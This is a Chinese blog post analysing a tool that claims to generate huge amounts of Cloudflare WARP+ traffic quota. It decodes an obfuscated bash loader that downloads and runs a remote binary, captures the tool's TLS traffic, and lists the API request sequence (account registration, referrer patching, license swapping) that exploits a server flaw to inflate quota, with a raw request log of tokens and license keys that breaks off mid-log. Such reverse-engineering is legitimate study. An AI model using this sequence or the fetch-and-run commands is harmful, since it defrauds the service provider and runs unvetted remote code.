[{"content":"本文来源: MoeomuBlog\n本文所有提及的代码和相关文件可从此链接cloudflare-warp-analyze.zip下载。\n如果您身处中国，此博客的图片可能会加载不出来，请勇敢跨越中国国家防火墙。\n起因 在网上闲逛时，发现一个这样的项目：一键生成2000多万GB的warp+密钥，你懂的。不管你懂了没有，反正笔者是没看懂。它为什么能产生这么多的密钥？也许是有一个列表，然后每次运行的时候随机抽一个？\n文件 既然来都来了，不fork一下说不过去啊。看到这里有几个文件，首先是replit.nix里写明了这个项目入口是wpplusreplit.sh，那就先从它看起。\n1 2 3 4 5 \u0026gt; file * README.md: UTF-8 text replit.nix: ASCII text warpplus.sh: ELF executable, 64-bit LSB x86-64, dynamic (/lib64/ld-linux-x86-64.so.2), BuildID=3dfe013b3027047470d1aac10a3504baf6969725, stripped wpplusreplit.sh: ASCII text wpplusreplit.sh wpplusreplit.sh代码被混淆了，不出所料。\n只是区区简单的变量名混淆，稍微有点常识就知道用bash -x调试一下代码就行，结果如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 bash -c \u0026#39;bash -c \u0026#34;$(base64 -d \u0026lt;\u0026lt;\u0026lt; \u0026#34;\\ YmFzaCAtYyAiJChiYXNlNjQgLWQgPDw8ICJcClltRnphQ0F0WXlBaUpDaGlZWE5sTmpRZ0xXUWdQ RHc4SUNKY0NsbHRSbnBoUTBGMFdYbEJhVXBEYUdsWldFNXNUbXBSWjB4WFVXZFEKUkhjNFNVTktZ ME5zYkhSU2JuQm9VVEJHTUZkWWJFSmhWWEJFWVVkc1dsZEZOWE5VYlhCU1dqQjRXRlZYWkZFS1Vr aGpORk5WVGt0WgpNRTV6WWtoU1UySnVRbTlWVkVKSFRVWmtXV0pGU21oV1dFSkZXVlZrYzFkc1pF Wk9XRTVWWWxoQ1UxZHFRalJYUmxaWVdrWkZTMVZyCmFHcE9SazVXVkd0MFdncE5SVFY2V1d0b1Ux VXlTblZSYlRsV1ZrVktTRlJWV210WFYwcEdVMjFvVjFkRlNrWlhWbFpyWXpGa2MxcEYKV2s5WFJU VldXV3hvUTFVeFpIRlJhbEpZVW14YVdWZHJXa1pUTVZaeUNtRkhjRTlTYXpWWFZrZDBNRmRuY0U1 U1ZGWTJWMWQwYjFVeApWWGxUYmxaU1lsUnNWMVpyVmt0VFJsSldWMjEwV0ZZd2NFZFZNakZ2VmpG a1JsTnJXbGhXYkZweVdYcEdhMk14Y0VZS1YyczVXRkpVClZsZFhWM2h2VVRGVmVGcElSbEpoYkVw WlZXMTRZVmRXWkhKWGExcFVUVlphZVVOdFJraGpSVGxUWVhwV1dGWnJaREJOUm1SdVkwVTEKVTFa R1dUSldNV1F3WWpGVmVBcFdXR3hVWW14YVUxbHNVbk5XTVZweVZtdDBWRkpzU2xkV01qRXdWMFpa ZDJORlpGWk5ha1oyVm1wRwphMUpzVG5KWGJHaFhZa1p3ZVZkWWNFZGhNazE0WTBWWlMxWXljelZY UmtwVkNsWnNaRmhXTTJoMlZWUkdWbVZHY0VsU2JFcG9Za1Z3CldsWlhNVFJaVm1SWFdraEtXR0V4 Y0ZWVVZscGhaVlZPZEZKcmFHcFNWR3hVV1Zod1YxZEdXbkphUkVKT1VtMVNkVmt3VlRFS1ZURmEK UjFkVVJsZE5WMUYzVmxSR1dtVkJjRmRYUjJob1ZXeGtVMk5XVm5GUmJVWmFWbTE0ZVZkcldrdFVi RXB6VTJ4b1YwMXVhRkJXVkVaaApZMnMxV1dKSFJsTldNVW95Vm14U1FncGxSa3BYVTJ4V1UySkhV azlaYlhSTFVsWmFSMVp0Um1wTlZtdzBWMnRhY2xNeFpISldWRlpZClVtdHdNVU5zUm5SaFJtaFha V3RKTUZac1VrSmtNbFpJVTJ0c1ZHSkhhSEJaVkU1RENtVnNXblJqUlU1YVZtczFlbFl4YUhOaE1V NUgKWTBaV1ZWWnNjR2hXYlhSUFl6RktkVkpzV21sWFJrcDNWbTE0VTFZd05VZFhXR3hyVWpOQ2Mx VnFRbUZWTVd0M1draE5TMWxWVlhnSwpWMVpHY2sxV1pHaE5XRUpWVmxSS2VtVkdaRUpqUm1ScFVq RktiMVpYTUhoaU1WWkhWMjVLVjJKdFVuRlphMlEwVm14VmVXTkZPVlZpClZYQkpXbFZhWVZZeFNY cGhTRXBYWVRKU1RBcFdha1pQWTFaR2MxWnJOVmRoTTBKT1ZtMXdTbVZCY0ZOTmF6VjVWR3hhVjFW dFNrbFIKYmtKV1lsaFNNMXBXV21Ga1IxWklaRVpTVGxZeFNrcFdiVEV3WTJ4TmVHSklTbGhoZW14 WENsUlZVa05PUlU1elUyNUdWbUpIVWxoVgpiRkpXWld4YWNsVnJkRlZOVld3MVZURm9kMWxXU1hw VmJGSlZWbnBXZGtOdFVuTlhibEpxVWxoU1YxUldXa3RYUmxsNFlVYzVXbFpyCk5VY0tXVEJhVjFa V1duTlhiR2hWWWtaYVVGa3ljekZXTVdSMFpFWk9UazFWY0ZaV2JURjNWREpKZUZOdVRsaGhNbEpa V1d4U2MyTlcKVWxkYVJGSldUVmQwTTFkcll6UlRNVnB4VW0xRlN3cFdNR1JUVG14T2MxcEhhR2hO V0VKMlZqRmtkMUl4VW5SV2JFcHFVbXh3V1ZWcQpUbTlXTVdSWFZXdDBhVTFyTVRSV2JUVkxWakpL VmxkdVJsZGlWRlpFVmpCYVlWZEhWa2hrUmxaT0NtRXpRa3BYYkZaaFlURmFkRk5zClZsZGlhM0JZ VldwT1QwNUJjRmROUmxVeFZteGFZV014Y0VoaVJtaFRWbGhDUjFadGVGTlRNRFZDWTBaT1RsSkdX alpXVkVreFZERlcKZEZOclpGUUtZa2RvV0ZsWGRHRlVSbEpZWlVkR1UwMVdjREJhUlZwaFZHeGFW VlpzYkZkV2VrRjRWbTE0VG1WSFJYcGFSbWhvVFVSVwpka05zVm5SbFNHUlVWbFUxZWxscVRuZGhW a3AwVldzNVdncGlXRkpNVmtaYWExZFhUa1pUYlhoVFlYcFdTVlpyWXpGVE1rWkhVMjVLClQxZEZT bGhaVjNNeFpHdE9jMVZZYUdGU2JXaHpWVzE0ZDFReFduTlZhMlJzWWtkNGVWbFZWVFZXTVZwekNt TkZaMHRXYWtreFZERloKZVZKdVNsaGhNbWhXV1d0YVlWVkdjRVpYYkdScVlsVmFSMVF4V210VWF6 RjBZVVp3VjJFeGNISmFWM040VTBaYWMxcEdhR2xTTVVwWQpWMVpTUWsxV2JGY0tWMjVPVm1FeGNI TlphMlF3VFRGWmVVNVhjRlJOVm13elZqSjBlbE4zY0ZkTlZuQklWakZrVDFJeGNFZFViR1JPClls ZGplRlpxU2pCVk1VMTRWbGhzVm1Fd2NIRlZiWGhoWTBac2NncFdibVJYVm0xU1dGZHJhSGRVYkZw elUyNXdWMVl6YUhaWlYzaEwKVjBaV2RWRnNWbGRpVmtWM1ZtcENZV0V4WkZoVWExcFZZbGRvVDBO dFJYcFJiR2hYVWpOb1dGbDZSbUZXYXpGWENtRkhhRk5XYTNCbwpWbTB3ZUZVeFVrSmpSbkJzWVRG d1RWZFVSbUZVTWxKSFUyNU9WV0pGTlZsVmJGWjNVekZhY1ZOcVVscFdNRmw2V1RCYVYxUnNXbFZX CmJHeFhWbnBCZUZacVJtRUtWMFpPYzJKR1dVdFphMlEwVmpGc2NsZHJkRk5OV0VKWFZqSXhNRmRH V1hkT1ZXUmhVbGRTZWxsV1drdE8KYlVZMlVXeGtWMkpWTVRSV1ZtUTBWRzFXUjFac2JHaFNNRnBV Vld4V2R3cGhSVTV6VjI1U1RsWnJOVlZWYkZVeFRVWlZlV1JHWkZkUwpNSEJLVlZjMVExWjNjR2hO V0VKdlZtcEdZV0V4WkZoVWExcHJVbXhLVDFac2FFTlRWbHBZVFZSU2FrMXJXbGhWTWpWTENsZEhT bFZpClJtaGFZa1pLUjFwWGRFOWphekZXV2taa2FWSnNjRlpXYWtKcllqRmFjMVZzYUd0VFJUVlFW bTE0VjA1V2NGWlplbFpYWWtWd2VrTnQKU2tWWFZYUlhZa2RSZDFSVldtRUtZekZrY2xkck9WZGhl bFpYVm0xNFlWbFdWa2RoTTJ4T1ZsaFNWRmxzVm5kVFZsWjBaVVU1VldKVgpjRmxaVlZKVFZqQXhX RlJxVWxWV1ZuQlBXa1JCZUZOWFJraGlSbEpUVjBWS01ncFdiR04zWlVaVmVWUllaMHRaYTFwWFZs ZEtWV0pGCk9WZGlXR2d6VlRGYVUxWnNWbk5YYkZKT1ZteHdOVll5ZEZkaGJFNHpZMFprYVZKdVFs bFhWRVpoVkRKU1IxTnVUbFZpUlRWWkNsVnMKVm5kVE1WcHhVMnBTV2xZd1ZqUldWbWh2VmxkS1Jt TklSbFppV0ZJeldUQmFjMWRSY0dwU2JWSnpWbTE0ZDJWR1ZsaGxSMFpwVW10dwpWbFZ0ZUc5WGJV VjRVMjFvVjJFeVVrd0tWbXhhWVdNeFduUlNiR1JwVW01Qk1sWXlkRk5TTVZGNFdrVm9WR0V4Y0Za WmJHUnZWMFZPCmRGTnNiR2hTTUZwWVdWUktUMDB4VW5OWGF6bHFUVlZ3V2tOc2NFaGlSbEpUVjBW S1dRcFdiVEUwVm1zeFYxUnFUbXBTYkhCUFZGYzEKYjFSR1pGVlJiR1JxVFdzMVNGVnROVk5oVmtw MVVXeHNWbUpHU2xoVVYzaFdaVVphY2s5V1VtbFdWbXcyVjFSQ1lWTXhWbkpOVldocwpDbEpVUmxW V2FrbzBaVlpzVjFadVRVdFZNRnBQWkVkR1NHSXdkRlZXZWtaeVdXMTRUMWRIU2tkVWJFcFhWak5v TVZkWE5YWmtNa1pXClpFWlNWRll5VW1GWmJGWmhUbXhzVmxSclNtZ0tWbGhDUjFWV1pITlNSbkEy VFVSc1NtRlhkSEJUVldSTFlVZE5lVm95WkVwaFZrcEMKVTFka2RsQlRTWEJKYVVKcFdWaE9iMGxE U1d0UlEwbExJaWtpSUdKaGMyZ2dJaVJBSWdvPSIpIiBiYXNoICIkQCIK\u0026#34;)\u0026#34; bash \u0026#34;$@\u0026#34;\u0026#39; bash 继续用base64解码，最终得到如下的代码：\n1 2 3 4 5 6 7 #!/bin/bash echo echo \u0026#34;请稍等，下载更新中……\u0026#34; rm -rf warpplus.sh wget -N https://gitlab.com/rwkgyg/CFwarp/-/raw/main/point/warpplus.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 chmod +x warpplus.sh ./warpplus.sh 什么？啊？啊？啊？就是更新一下然后启动warpplus.sh文件是吧？\nCFwarp.sh 上文提到了一个项目rwkgyg/CFwar，似乎是这个脚本的作者存储这些脚本和更新的地方。在这里找到的CFwarp.sh再次使用上述方法解密后，得到如下代码：\n1 2 3 4 5 6 7 8 9 ... if [[ $cpu = amd64 ]]; then curl -sSL -o warpplus.sh --insecure https://gitlab.com/rwkgyg/CFwarp/-/raw/main/point/warpplus.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 elif [[ $cpu = arm64 ]]; then curl -sSL -o warpplus.sh --insecure https://gitlab.com/rwkgyg/CFwarp/-/raw/main/point/warpplusa.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 fi chmod +x warpplus.sh timeout 60s ./warpplus.sh ... 这一部分代码和wpplusreplit.sh所展示的下载地址相同，由于笔者使用的是arm架构操作系统，因此下载新的warpplusa.sh，上述代码证明它的功能和warpplus.sh相同。\nwarpplus.sh 这是一个Linux系统下的可执行文件，在文件中已经可以看出来，因此本节围绕此文件展开分析。\n查看基本信息 使用Detect it easy检查一下此文件的详细信息，可惜并没有能得到什么有价值的内容。只能看出这个可执行文件是由GCC编译来的，语言可能是C/C++。\n另外可以清晰看出，这个可执行程序内包含了python的一些代码，但这整个程序似乎都只是一个压缩包，需要解压缩。\npydata 如下图所示，这个巨大的pydata节就是此程序要解压的对象，将它转储出来之后也确实可以识别出它是zlib压缩后的文件，但笔者并没有尝试去解压缩分析这个巨大的文件内容，事实证明这是对的，后文将会提及原因。\n网络分析 在笔者分析网络之前，也使用strace追踪了它调用的系统API，但是并没有得到什么有价值的信息，因此这些内容省略，但是strace的记录日志在附件中一并提供。\n既然这个程序是使用网络请求获得WARP无限流量Key的，那么即使不看代码，只分析网络请求我们也能将原理猜到。\n按照这个思路，首先安装了burpsuite。不幸的是，此软件将需要用到的证书内置其中，burpsuite的证书无法用于解密它的流量。\n在运行过程中，笔者发现它会在/tmp文件夹下释放python运行环境库，这些文件共计14M。这也解释了上文的pydata中的内容。\n至此，网络分析只剩下导出客户端密钥这一条路可以走。\n设置环境变量，在当前tty中导出SSLKEY到WarpPlus-TrafficCapture-Key.log文件中\n1 export SSLKEYLOGFILE=WarpPlus-TrafficCapture-Key.log 使用root权限打开wireshark，监听网卡\n在当前tty中运行warpplus.sh，等待它退出后停止wireshark监听\n在wireshark中设置TLS-(Pre)-Master-Secret log filename为上文导出的文件，如题所示。 在wireshark中打开http流分析，转储到文件中，内容请点击这里查看\n剧透 2023年10月10日增补内容\n根据How to get free 12PB to Your Warp Key [BUG / BUFF]所描述，符合以下操作就可以将空账户刷入另一个账户的推荐数量。\n备份当前设备所拥有的license。 使用一个账户中已有极多推荐数量的license替换到当前设备中。 重新启动WARP程序。 重新将曾经备份到license替换到当前设备中。 这也解释了下文的请求过程，Cheers！\n分析过程 为了您的脑子健康，我直接将下文的总结写在这里，本文到此结束。您可以不用看后文的详情。\n客户端请求：POST /v0a2223/reg。解释：请求创建一个Cloudflare WARP的A账户。 服务端响应：JSON数据。解释：A账户目前是空账户。返回了代表客户端的设备ID和账户license。 客户端请求：POST /v0a2223/reg。解释：请求创建一个Cloudflare WARP的B账户。 服务端响应：JSON数据。解释：B账户目前是空账户。返回了代表客户端的设备ID和账户license。 客户端请求：PATCH /v0a2223/reg/v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739，携带的参数963be82f-4a90-45a8-aaac-be558383fe44是第4步中，B账户代表客户端的设备ID。解释：由于0b831bf3-224d-4d45-869b-b59edd27e739是A账户代表客户端的设备ID，因此这次请求中A账户成为了B账户的引荐人。 服务端响应：对比首次返回数据，删除\u0026quot;usage\u0026quot;:0，增加\u0026quot;referrer\u0026quot;:\u0026quot;963be82f-4a90-45a8-aaac-be558383fe44\u0026quot;。 客户端请求：DELETE /v0a2223/reg/963be82f-4a90-45a8-aaac-be558383fe44。解释：删除账户B链接的设备963be82f-4a90-45a8-aaac-be558383fe44。 服务端响应：204 No Content。解释：操作成功。 客户端请求：PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account，携带参数为{\u0026quot;license\u0026quot;: \u0026quot;u7SOF218-6zQ092Od-95qVJ02k\u0026quot;}。解释：更改A账户所链接的设备0b831bf3-224d-4d45-869b-b59edd27e739的license为u7SOF218-6zQ092Od-95qVJ02k。 服务端响应：\u0026quot;id\u0026quot;: \u0026quot;2b4d3261-ad36-4069-95ea-53520cd42a58\u0026quot;。解释：授予此设备新的设备ID。 客户端请求：PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account，携带参数为{\u0026quot;license\u0026quot;: \u0026quot;7O95xNh3-81E65Kce-W4ln892I\u0026quot;}。解释：更改无WARP账户链接的设备0b831bf3-224d-4d45-869b-b59edd27e739的license为7O95xNh3-81E65Kce-W4ln892I。 服务端响应：\u0026quot;id\u0026quot;: \u0026quot;2b4d3261-ad36-4069-95ea-53520cd42a58\u0026quot;,\u0026quot;referral_count\u0026quot;: 24598563。解释：Cloudflare服务端似乎出现异常，无账户链接的设备0b831bf3-224d-4d45-869b-b59edd27e739引荐数量变成24598563。 客户端请求：GET /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account。解释：请求此无WARP账户链接的设备详细资料。 服务端响应：\u0026quot;premium_data\u0026quot;: 24598563000000000,\u0026quot;quota\u0026quot;: 24598563000000000,\u0026quot;referral_count\u0026quot;: 24598563。解释：Cloudflare服务端似乎出现异常，一个无限WARP流量账户创建成功。 客户端请求：DELETE /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739。解释：删除此无WARP账户链接的设备。 服务端响应：204 No Content。解释：操作成功。 WarpPlus TrafficCapture HTTPStream 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 POST /v0a2223/reg HTTP/1.1 Host: api.cloudflareclient.com Content-Length: 0 Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:13 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492d808d996c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-cache-set: true x-envoy-upstream-service-time: 625 Set-Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo=; path=/; expires=Mon, 09-Oct-23 07:00:13 GMT; domain=.cloudflareclient.com; HttpOnly; Secure; SameSite=None Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=%2F8Gdnjhpm99lkfYYkpf9I%2B4wMlEDZtiQuhUK1tBiAk7TwjKtvEnrjr9fBFDSEja3O4YSdnT%2FHR2JFKbsW1zm7ITkDMUZDI8kwyTLScq8fvuHdpTSXyIN9aME%2BZAVjVxWRr5gdOXuMMfCcQ%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;0b831bf3-224d-4d45-869b-b59edd27e739\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;account\u0026#34;:{\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;free\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.823920679Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:12.823920679Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;usage\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;},\u0026#34;token\u0026#34;:\u0026#34;40ca084f-315e-45e2-9191-b59199c2331a\u0026#34;,\u0026#34;warp_enabled\u0026#34;:false,\u0026#34;waitlist_enabled\u0026#34;:false,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.509754043Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:12.509754043Z\u0026#34;,\u0026#34;place\u0026#34;:0,\u0026#34;locale\u0026#34;:\u0026#34;zh-CN\u0026#34;,\u0026#34;enabled\u0026#34;:true,\u0026#34;install_id\u0026#34;:\u0026#34;\u0026#34;} POST /v0a2223/reg HTTP/1.1 Host: api.cloudflareclient.com Content-Length: 0 Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:14 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492de4daa96c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-cache-set: true x-envoy-upstream-service-time: 803 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=rQULnzZb4N3TSVT6j8frTuQE01%2FJ4o58lJs4h9ROd%2F5EUN%2BhmxsjB%2BgU3%2B60wkEvCqNngwsddsIej6cIqS1nnZlTgM4mSFAvbSYwY4UurL3GOdMqNdqHCmpHkysd5UaV5l0uz3BCCNivKQ%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;963be82f-4a90-45a8-aaac-be558383fe44\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;account\u0026#34;:{\u0026#34;id\u0026#34;:\u0026#34;ec26bf68-baa5-445a-b6b3-c8fb628509a2\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;free\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:13.899453227Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:13.899453227Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;usage\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;2W07lo5d-90c2f7TE-sK7Tq803\u0026#34;},\u0026#34;token\u0026#34;:\u0026#34;379fc773-f8ab-45b2-a7cd-672dbf72e748\u0026#34;,\u0026#34;warp_enabled\u0026#34;:false,\u0026#34;waitlist_enabled\u0026#34;:false,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:13.501458226Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:13.501458226Z\u0026#34;,\u0026#34;place\u0026#34;:0,\u0026#34;locale\u0026#34;:\u0026#34;zh-CN\u0026#34;,\u0026#34;enabled\u0026#34;:true,\u0026#34;install_id\u0026#34;:\u0026#34;\u0026#34;} PATCH /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739 HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Content-Type: application/json; charset=UTF-8 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= Content-Length: 52 {\u0026#34;referrer\u0026#34;: \u0026#34;963be82f-4a90-45a8-aaac-be558383fe44\u0026#34;} HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:16 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492e5ebdc96c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-cache-set: true x-envoy-upstream-service-time: 1608 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=ftYufwYVFe9blsUVXEH%2Bx7GGcyvLZDeToO7yhv1zKvkVerVw4By89zAfkP58xBnwWinHJLlybAoipaUM7yej7lmQhlUHLV8KzAXfORubkpvtrxizutxWESQu8m9DfE0AcTJU%2F9%2FnNt7AOw%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;0b831bf3-224d-4d45-869b-b59edd27e739\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;account\u0026#34;:{\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;free\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.82392Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:12.82392Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;},\u0026#34;warp_enabled\u0026#34;:false,\u0026#34;waitlist_enabled\u0026#34;:false,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.509754Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:14.909577261Z\u0026#34;,\u0026#34;place\u0026#34;:0,\u0026#34;locale\u0026#34;:\u0026#34;zh-CN\u0026#34;,\u0026#34;enabled\u0026#34;:true,\u0026#34;install_id\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;referrer\u0026#34;:\u0026#34;963be82f-4a90-45a8-aaac-be558383fe44\u0026#34;} DELETE /v0a2223/reg/963be82f-4a90-45a8-aaac-be558383fe44 HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Authorization: Bearer 379fc773-f8ab-45b2-a7cd-672dbf72e748 Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 204 No Content Date: Mon, 09 Oct 2023 06:30:17 GMT Connection: keep-alive Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=Cp6WP7S5U1wpURnPmkVX9o5wdGZj0DpZF6i7XdLAoVmC%2BTMjdFRuU4r1uRXpPJgD9qtRI9g2FEuV4c9vO%2F%2BPDaCb6GQ%2F0gfQBLOC2gCoLXFXYSiE3C%2Fm82%2Bcli8PCFsavtchA6D3VumK4g%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Vary: Accept-Encoding Server: cloudflare CF-RAY: 813492f20d3796c0-SJC PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Content-Type: application/json; charset=UTF-8 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= Content-Length: 41 {\u0026#34;license\u0026#34;: \u0026#34;u7SOF218-6zQ092Od-95qVJ02k\u0026#34;} HTTP/1.1 200 OK Date: Mon, 09 